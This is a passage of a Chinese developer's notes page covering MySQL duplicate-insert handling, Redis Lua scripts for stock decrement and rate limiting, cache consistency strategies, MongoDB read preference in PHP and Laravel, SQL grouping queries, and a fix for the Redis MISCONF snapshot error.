class="string">`uid`</span>, <span class="string">`last_time`</span>) VALUES (<span class="string">'8e9b8c14-fae8-49d4-bbac-a733c09ec82f'</span>, <span class="string">'2017-09-01 19:31:15'</span>) ON DUPLICATE  KEY UPDATE <span class="string">`last_time`</span> = <span class="string">'2017-09-01 19:40:15'</span></span><br><span class="line">SQL 执行影响记录数为 <span class="number">2</span> 条</span><br><span class="line">INSERT IGNORE INTO <span class="string">`allowed_user`</span> (<span class="string">`uid`</span>, <span class="string">`last_time`</span>) VALUES (<span class="string">'8e9b8c14-fae8-49d4-bbac-a733c09ec82f'</span>, <span class="string">'2017-09-01 19:41:15'</span>)</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $user = $model-&gt;query(<span class="string">"SELECT * FROM `allowed_user` WHERE `uid` = '8e9b8c14-fae8-49d4-bbac-a733c09ec82f'"</span>);</span><br><span class="line">    <span class="keyword">if</span> (user) &#123;</span><br><span class="line">       $model-&gt;exec(<span class="string">"UPDATE `allowed_user` SET `last_time` = '2017-09-01 19:50:15' WHERE `uid` = '8e9b8c14-fae8-49d4-bbac-a733c09ec82f'"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $model-&gt;exec(<span class="string">"INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:50:15'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">这段代码通过程序逻辑去试图保证唯一性，但是在高并发情况下，并不能保证数据唯一性，因为不是原子性操作，修改后为：https:<span class="comment">//www.fanhaobai.com/2017/09/mysql-repetition-deal.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $model-&gt;exec(<span class="string">"INSERT INTO `allowed_user` (`uid`, `last_time`) VALUES ('8e9b8c14-fae8-49d4-bbac-a733c09ec82f', '2017-09-01 19:50:15') ON DUPLICATE  KEY UPDATE `last_time` = '2017-09-01 19:50:15'"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">替换掉异常数据的特殊换行符即可。</span><br><span class="line"></span><br><span class="line">UPDATE table_a SET uid = REPLACE(REPLACE(uid, CHAR(<span class="number">10</span>), <span class="string">''</span>), CHAR(<span class="number">13</span>), <span class="string">''</span>);</span><br><span class="line">在 MySQL 中，CHAR(<span class="number">10</span>) 和 CHAR(<span class="number">13</span>) 分别代 换行符 和 回车符，这里都替换掉。</span><br></pre></td></tr></table></figure>
<h3 id="lua-抢购场景"><a href="#lua-抢购场景" class="headerlink" title="lua 抢购场景"></a>lua 抢购场景</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$key = <span class="string">'number:string'</span>;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$number = $redis-&gt;get($key);</span><br><span class="line"><span class="keyword">if</span> ($number &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$redis-&gt;decr($key);</span><br><span class="line"><span class="keyword">return</span> $number--;</span><br><span class="line">local key = <span class="string">'number:string'</span></span><br><span class="line">local number = tonumber(redis.call(<span class="string">"GET"</span>, key))</span><br><span class="line"><span class="keyword">if</span> number &lt;= <span class="number">0</span> then</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">end</span><br><span class="line">redis.call(<span class="string">"DECR"</span>, key)</span><br><span class="line"><span class="keyword">return</span> number--</span><br><span class="line">Redis 中嵌入 Lua 脚本，所具有的几个特性为：</span><br><span class="line"></span><br><span class="line">原子操作：Redis 将整个 Lua 脚本作为一个原子执行，无需考虑并发，无需使用事务来保证数据一致性；</span><br><span class="line">高性能：嵌入 Lua 脚本后，可以减少多个命令执行的网络开销，进而间接提高 Redis 性能；</span><br><span class="line">可复用：Lua 脚本会保存于 Redis 中，客户端都可以使用这些脚本；</span><br><span class="line">Redis 中执行 Lua 脚本都是以原子方式执行，所以是原子操作。另外，redis-cli 命令行客户端支持直接使用--<span class="built_in">eval</span> lua_file参数执行 Lua 脚本。</span><br><span class="line">&gt; EVAL <span class="string">"return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;"</span> <span class="number">2</span> key1 key2 first second</span><br><span class="line"><span class="number">1</span>) <span class="string">"key1"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"key2"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"first"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"second"</span></span><br><span class="line">&gt; EVAL <span class="string">"return 3.333"</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">3</span></span><br><span class="line">&gt; EVAL <span class="string">"return 'fhb'"</span> <span class="number">0</span></span><br><span class="line"><span class="string">"fhb"</span></span><br><span class="line">&gt; EVAL <span class="string">"return &#123;'fhb', 'lw', 'lbf'&#125;"</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span>) <span class="string">"fhb"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"lw"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"lbf"</span></span><br><span class="line">&gt; EVAL <span class="string">"return false"</span> <span class="number">0</span></span><br><span class="line">(nil)</span><br><span class="line">&gt; EVAL <span class="string">"return true"</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line">通过 Lua 实现一个针对用户的 API 访问速率控制，Lua 代码如下：</span><br><span class="line"></span><br><span class="line">local key = <span class="string">"rate.limit:string:"</span> .. KEYS[<span class="number">1</span>]</span><br><span class="line">local limit = tonumber(ARGV[<span class="number">1</span>])</span><br><span class="line">local expire_time = tonumber(ARGV[<span class="number">2</span>])</span><br><span class="line">local times = redis.call(<span class="string">"INCR"</span>, key)</span><br><span class="line"><span class="keyword">if</span> times == <span class="number">1</span> then</span><br><span class="line">    redis.call(<span class="string">"EXPIRE"</span>, key, expire_time)</span><br><span class="line">end</span><br><span class="line"><span class="keyword">if</span> times &gt; limit then</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">end</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">KEYS[<span class="number">1</span>] 可以用 API 的 URI + 用户 uid 组成，ARGV[<span class="number">1</span>] 为单位时间限制访问的次数，ARGV[<span class="number">2</span>] 为限制的单位时间。</span><br><span class="line">&gt; EVAL <span class="string">"return redis.call('SET', 'name', 'fhb')"</span> <span class="number">0</span></span><br><span class="line">&gt; EVAL <span class="string">"return redis.pcall('GET', 'name')"</span> <span class="number">0</span></span><br><span class="line"><span class="string">"fhb"</span></span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/09/lua-in-redis.html</span></span><br></pre></td></tr></table></figure>
<h3 id="缓存与数据库双写一致性问题"><a href="#缓存与数据库双写一致性问题" class="headerlink" title="缓存与数据库双写一致性问题"></a>缓存与数据库双写一致性问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">周所周知，在项目性能优化、提升的时候，我们引进了一个缓存的概念，即一款缓存数据的技术，项目在最初期架构规划时都会引进的一个组件。使用缓存有很多好处：加快请求的响应速度、减少数据库的交互与浪费大量的IO操作等，但是在某些场景下使用缓存也有可能会造成雪崩、剧透、数据不一致等问题，我们研究下使用缓存会导致有哪些数据不一致的情况发生以及在哪些场景会使用哪些具体的解决方案，首先我们必然还是会使用缓存的。</span><br><span class="line"></span><br><span class="line">缓存更新策略</span><br><span class="line"></span><br><span class="line">先更新数据库再更新缓存</span><br><span class="line"></span><br><span class="line">浪费资源</span><br><span class="line">每次去更新数据库再更新缓存都是需要申请CPU进行数据库的修改的，同时倘若数据的修改比较频繁以及数据的读操作却又比较少的时候，这种策略会导致出现冷数据的情况。</span><br><span class="line">数据脏读</span><br><span class="line">如果两个操作同时对数据进行操作时，举个栗子：线程A 在线程B更新数据库成功后、更新缓存成功之前读取到数据，也就是读取到了缓存的旧数据。</span><br><span class="line">该策略比较适合更新的频次比较少的场景下，比如博客的文章、基础数据、个人信息等场景。</span><br><span class="line">先更新数据库再删除缓存</span><br><span class="line"></span><br><span class="line">数据脏读</span><br><span class="line">一个请求处理中过程中，倘若数据库更新成功了但是缓存更新失败了，那么后面的请求读取的数据都是旧数据、则脏数据。可以通过缓存过期时间定义缓存的有效期(推荐)，或者使用消息队列在删除缓存失败的时候再次异步更新缓存，直到成功为止，这两种方案都是尽可能减少读取脏数据的方案，还有一种方案可以完全解决数据脏读，就是异步请求串行化，一个字锁，但是会增加业务处理的时间甚至会出现死锁的情况。</span><br><span class="line">这种缓存操作的策略使用的情况被使用的比较多、使用的场景也比较广泛。</span><br><span class="line">先删除缓存再更新数据库</span><br><span class="line">数据脏读</span><br><span class="line">与第二种情况类似，但是更容易出现数据脏读，比如：删除缓存失败更新数据库成功(一般的业务可能在缓存修改失败后不再进行数据库的更新了)、线程B读取了线程A已经成功删除了缓存后更新数据库之前读取了脏数据并且也导致缓存的数据也是旧数据。解决方案还是使用缓存过期时间或者消息队列，在缓存过期的时候务必要注意雪崩的问题，比如大批量数据的过期时间几乎集中在同一个时间点上，容易造成雪崩。</span><br><span class="line"></span><br><span class="line">VARCHAR(N) 中的 N 代表的是字符数，而不是字节数。使用 UTF8 存储 <span class="number">255</span> 个汉字 Varchar(<span class="number">255</span>)=<span class="number">765</span> 个字节。过大的长度会消耗更多的内存</span><br><span class="line"> 优先选择符合存储需要的最小的数据类型</span><br><span class="line"> 方法</span><br><span class="line"> <span class="number">1</span>、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。</span><br><span class="line"> </span><br><span class="line"> MySQL 提供了两个方法来处理 IP 地址</span><br><span class="line"> </span><br><span class="line"> inet_aton 把ip转为无符号整型(<span class="number">4</span><span class="number">-8</span>位)</span><br><span class="line"> inet_ntoa 把整型的ip转为地址</span><br><span class="line"> 插入数据前，先用 inet_aton 把 IP 地址转为整型，可以节省空间。显示数据时，使用 inet_ntoa 把整型的 IP 地址转为地址显示即可。</span><br><span class="line"> </span><br><span class="line"> <span class="number">2</span>、对于非负型的数据（如自增 ID、整型 IP）来说，要优先使用无符号整型来存储,因为无符号相对于有符号可以多出一倍的存储空间。</span><br><span class="line"> SIGNED INT <span class="number">-2147483648</span>~<span class="number">2147483647</span></span><br><span class="line"> UNSIGNED INT <span class="number">0</span>~<span class="number">4294967295</span></span><br><span class="line"> 同财务相关的金额类数据必须使用 decimal 类型</span><br><span class="line"> </span><br><span class="line"> 非精准浮点：float，double</span><br><span class="line"> 精准浮点：decimal</span><br><span class="line"> Decimal 类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每 <span class="number">4</span> 个字节可以存储 <span class="number">9</span> 位数字，并且小数点要占用一个字节。可用于存储比 bigint 更大的整型数据。</span><br><span class="line">  避免数据类型的隐式转换</span><br><span class="line"> </span><br><span class="line"> 隐式转换会导致索引失效。如：</span><br><span class="line"> select name,phone <span class="keyword">from</span> customer where id = <span class="string">'111'</span>;</span><br><span class="line"> https:<span class="comment">//learnku.com/articles/25020#topnav</span></span><br></pre></td></tr></table></figure>
<h3 id="MongoDB读写分离"><a href="#MongoDB读写分离" class="headerlink" title="MongoDB读写分离"></a>MongoDB读写分离</h3><p>PHP7中的MongoDB\Driver\ReadPreference MongoDB读写分离（Read Preference）的几种模式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> integer RP_PRIMARY = <span class="number">1</span> ;</span><br><span class="line"><span class="keyword">const</span> integer RP_PRIMARY_PREFERRED = <span class="number">5</span> ;</span><br><span class="line"><span class="keyword">const</span> integer RP_SECONDARY = <span class="number">2</span> ;</span><br><span class="line"><span class="keyword">const</span> integer RP_SECONDARY_PREFERRED = <span class="number">6</span> ;</span><br><span class="line"><span class="keyword">const</span> integer RP_NEAREST = <span class="number">10</span> ;</span><br><span class="line"></span><br><span class="line">primary</span><br><span class="line">主节点，默认模式，读操作只在主节点，如果主节点不可用，报错或者抛出异常。</span><br><span class="line"></span><br><span class="line">primaryPreferred</span><br><span class="line">首选主节点，大多情况下读操作在主节点，如果主节点不可用，如故障转移，读操作在从节点。</span><br><span class="line"></span><br><span class="line">secondary</span><br><span class="line">从节点，读操作只在从节点， 如果从节点不可用，报错或者抛出异常。</span><br><span class="line"></span><br><span class="line">secondaryPreferred</span><br><span class="line">首选从节点，大多情况下读操作在从节点，特殊情况（如单主节点架构）读操作在主节点。</span><br><span class="line"></span><br><span class="line">nearest</span><br><span class="line">最邻近节点，读操作在最邻近的成员，可能是主节点或者从节点</span><br><span class="line">在使用mongo副本集的时候就在想，这些副本不用来读太浪费了，再翻阅php的mongodb驱动，发现一个美好的readPreference，可以设定读取的优先级，其中就有优先读取副本，甚至还可以设定读取最小网络延迟的节点，具体可以参考：http:<span class="comment">//php.net/manual/zh/mongodb-driver-readpreference.construct.php</span></span><br><span class="line">http:<span class="comment">//imhuchao.com/918.html</span></span><br><span class="line">写入安全级别的使用</span><br><span class="line">W选项</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>：非确认式写入</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：确认式写入</span><br><span class="line"></span><br><span class="line">说明：这个级别下，对副本级只对主库做确认写入</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：副本级确认式写入</span><br><span class="line"></span><br><span class="line">说明：这个级别下，副本集第一个slave写入成功后就响应给client</span><br><span class="line"></span><br><span class="line">majority：复制级更多slave写入成功后，在响应给client</span><br><span class="line">$filter = array();</span><br><span class="line">$options = array(</span><br><span class="line">    <span class="comment">/* Only return the following fields in the matching documents */</span></span><br><span class="line">    <span class="string">"projection"</span> =&gt; array(</span><br><span class="line">        <span class="string">"title"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">"article"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">"sort"</span> =&gt; array(</span><br><span class="line">        <span class="string">"views"</span> =&gt; <span class="number">-1</span>,</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">"modifiers"</span> =&gt; array(</span><br><span class="line">        <span class="string">'$comment'</span>   =&gt; <span class="string">"This is a query comment"</span>,</span><br><span class="line">        <span class="string">'$maxTimeMS'</span> =&gt; <span class="number">100</span>,</span><br><span class="line">    ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query($filter, $options);</span><br><span class="line"></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$readPreference = <span class="keyword">new</span> MongoDB\Driver\ReadPreference(MongoDB\Driver\ReadPreference::RP_PRIMARY);</span><br><span class="line">$cursor = $manager-&gt;executeQuery(<span class="string">"databaseName.collectionName"</span>, $query, $readPreference);</span><br><span class="line"></span><br><span class="line">foreach($cursor <span class="keyword">as</span> $<span class="built_in">document</span>) &#123;</span><br><span class="line">    var_dump($<span class="built_in">document</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi config/database.php</span><br><span class="line"><span class="string">"mongodb"</span> =&gt; [</span><br><span class="line">            <span class="string">'driver'</span> =&gt; <span class="string">'mongodb'</span>,</span><br><span class="line">            <span class="string">'host'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_HOST'</span>, <span class="string">'172.1.7.21'</span>),</span><br><span class="line">            <span class="string">'port'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_PORT'</span>, <span class="number">27017</span>),</span><br><span class="line">            <span class="string">'database'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_DATABASE'</span>, <span class="string">'app'</span>),</span><br><span class="line">            <span class="string">'username'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_USER'</span>, <span class="string">''</span>),</span><br><span class="line">            <span class="string">'password'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_PASSWORD'</span>, <span class="string">''</span>),</span><br><span class="line">            <span class="string">'options'</span> =&gt; [</span><br><span class="line">                <span class="string">'replicaSet'</span> =&gt; env(<span class="string">'MONGO_DEFAULT_REPLICASET'</span>),</span><br><span class="line">                <span class="string">'readPreference'</span>=&gt; env(<span class="string">'MONGO_READ_PREFERENCE'</span>, <span class="string">'nearest'</span>),</span><br><span class="line">            ]</span><br><span class="line">        ],</span><br><span class="line">vi  /vendor/jenssegers/mongodb/src/Jenssegers/Mongodb/Connection.php:<span class="number">28</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">array $config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;config = $config;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build the connection string</span></span><br><span class="line">        $dsn = $<span class="keyword">this</span>-&gt;getDsn($config);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// You can pass options directly to the MongoClient constructor</span></span><br><span class="line">        $options = array_get($config, <span class="string">'options'</span>, []);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create the connection</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;connection = $<span class="keyword">this</span>-&gt;createConnection($dsn, $config, $options);</span><br><span class="line">        dd($<span class="keyword">this</span>-&gt;connection-&gt;getReadPreference());</span><br><span class="line">        array:<span class="number">1</span> [▼</span><br><span class="line">          <span class="string">"type"</span> =&gt; <span class="string">"nearest"</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="comment">// Select database</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;db = $<span class="keyword">this</span>-&gt;connection-&gt;&#123;$config[<span class="string">'database'</span>]&#125;;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;useDefaultPostProcessor();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-分组获取最新记录"><a href="#Laravel-分组获取最新记录" class="headerlink" title="Laravel 分组获取最新记录"></a>Laravel 分组获取最新记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///https://learnku.com/articles/20626</span></span><br><span class="line">select * <span class="keyword">from</span> (select * <span class="keyword">from</span> project where user_id = :user_id order by id desc) <span class="keyword">as</span> a group by a.name order by id desc;</span><br><span class="line">select * <span class="keyword">from</span> (select * <span class="keyword">from</span> project where user_id = :user_id order by id desc limit <span class="number">10000</span>) <span class="keyword">as</span> a group by a.name order by id desc;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">projectList</span>(<span class="params">Request $request</span>)</span>&#123;</span><br><span class="line">        $limit = $request-&gt;get(<span class="string">'limit'</span>,<span class="number">10</span>);</span><br><span class="line">        $user_id = $request-&gt;get(<span class="string">'user_id'</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        $sub_query = Project::where(<span class="string">'user_id'</span>,$user_id)-&gt;orderBy(<span class="string">'id'</span>,<span class="string">'desc'</span>)-&gt;limit(<span class="number">1000</span>);<span class="comment">//子查询</span></span><br><span class="line"></span><br><span class="line">        $results = Project::select(<span class="string">'*'</span>)</span><br><span class="line">                -&gt;<span class="keyword">from</span>(DB::raw(<span class="string">'('</span>.$sub_query-&gt;toSql().<span class="string">') as a'</span>)) <span class="comment">//from() 类似与 DB::table(), toSql()得到带 ? 号的执行 sql 语句</span></span><br><span class="line">                -&gt;mergeBindings($sub_query-&gt;getQuery())<span class="comment">//mergeBindings() 合并绑定参数,getQuery()获得具体值</span></span><br><span class="line">                -&gt;groupBy(<span class="string">'name'</span>)</span><br><span class="line">                -&gt;orderBy(<span class="string">'id'</span>,<span class="string">'desc'</span>)</span><br><span class="line">                -&gt;paginate($limit);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pageDate($results);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="将分组无结果的记录显示为0"><a href="#将分组无结果的记录显示为0" class="headerlink" title="将分组无结果的记录显示为0"></a>将分组无结果的记录显示为0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//hshine.net/article/12 </span></span><br><span class="line">SELECT</span><br><span class="line">    ISNULL( SUM ( u_table1917.field5 ), <span class="number">0</span> ) As val,</span><br><span class="line">    u_table1916.companycode </span><br><span class="line">FROM</span><br><span class="line">    u_table1917</span><br><span class="line">    JOIN u_table1916 ON u_table1917.field3= u_table1916.field6 </span><br><span class="line">WHERE</span><br><span class="line">    u_table1916.field3 LIKE <span class="string">'2018%'</span> </span><br><span class="line">    AND u_table1916.companycode IN ( <span class="string">'GY00051'</span>, <span class="string">'GY00071'</span>, <span class="string">'GY00072'</span>, <span class="string">'GY00073'</span> ) </span><br><span class="line">GROUP BY</span><br><span class="line">    u_table1916.companycode</span><br><span class="line">    </span><br><span class="line">    SELECT DISTINCT Ma.companycode,ISNULL(Sub.val,<span class="number">0</span>) FROM --此处使用ISNULL对结果进行判空处理 </span><br><span class="line">    (</span><br><span class="line">    SELECT</span><br><span class="line">        u_table1916.companycode </span><br><span class="line">    FROM</span><br><span class="line">        u_table1917</span><br><span class="line">        JOIN u_table1916 ON u_table1917.field3= u_table1916.field6</span><br><span class="line">    --此处使用LEFT JOIN 关联，因为左表是包括所有数据记录的，而右表只包括符合条件的，这样就能获得</span><br><span class="line">    --将所有的结果来进行分组，再加上ISNULL的处理，就可以显示聚合为<span class="number">0</span>的记录</span><br><span class="line">    ) AS Ma LEFT JOIN </span><br><span class="line">    (</span><br><span class="line">    SELECT</span><br><span class="line">        SUM ( u_table1917.field5 ) As val,</span><br><span class="line">        u_table1916.companycode </span><br><span class="line">    FROM</span><br><span class="line">        u_table1917</span><br><span class="line">        JOIN u_table1916 ON u_table1917.field3= u_table1916.field6 </span><br><span class="line">    WHERE</span><br><span class="line">        u_table1916.field3 LIKE <span class="string">'2018%'</span> </span><br><span class="line">    GROUP BY</span><br><span class="line">        u_table1916.companycode</span><br><span class="line">    ) AS Sub ON Ma.companycode=Sub.companycode</span><br></pre></td></tr></table></figure>
<h3 id="MISCONF-Redis-is-configured-to-save-RDB-snapshots"><a href="#MISCONF-Redis-is-configured-to-save-RDB-snapshots" class="headerlink" title="MISCONF Redis is configured to save RDB snapshots"></a>MISCONF Redis is configured to save RDB snapshots</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">使用redis-cli，你可以这样做：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">CONFIG SET dir /tmp/some/directory/other/than/<span class="keyword">var</span></span><br><span class="line">CONFIG SET dbfilename temp.rdb</span><br><span class="line">千万不要使用https:<span class="comment">//blog.yiranzai.cn/posts/901/</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">config set stop-writes-on-bgsave-error no</span><br><span class="line">忽视这些错误并不是解决问题的办法。</span><br><span class="line"></span><br><span class="line">我的解决方案是</span><br><span class="line"></span><br><span class="line">修改配置文件，重启服务</span><br><span class="line"> </span><br><span class="line">$ mkdir /usr/local/redis/db</span><br><span class="line">$ vim redis.conf</span><br><span class="line"># 第263行左右  设置快照文件目录，切勿设置成一个redis用户没有权限的目录</span><br><span class="line">dir /usr/local/redis/db/</span><br><span class="line">$ chown -R redis:redis /usr/local/redis</span><br></pre></td></tr></table></figure>
